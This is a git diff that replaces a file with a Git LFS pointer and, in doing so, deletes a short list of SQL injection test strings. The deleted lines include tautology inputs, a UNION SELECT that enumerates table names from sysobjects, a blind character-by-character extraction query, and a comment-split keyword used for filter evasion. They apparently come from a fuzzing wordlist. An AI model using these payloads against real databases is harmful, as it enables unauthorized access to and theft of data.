@@ -1,10 +1,3 @@
-1
-1 and user_name() = 'dbo'
-\'; desc users; --
-1\'1
-1' and non_existant_table = '1
-' or username is not NULL or username = '
-1 and ascii(lower(substring((select top 1 name from sysobjects where xtype='u'), 1, 1))) > 116
-1 union all select 1,2,3,4,5,6,name from sysobjects where xtype = 'u' --
-1 uni/**/on select all from where
-
+version https://git-lfs.github.com/spec/v1
+oid sha256:7c4848e1c634acc2ee54b74161c3f5beb80f16f96fab9026c8c52dec52d0ed9c
+size 328
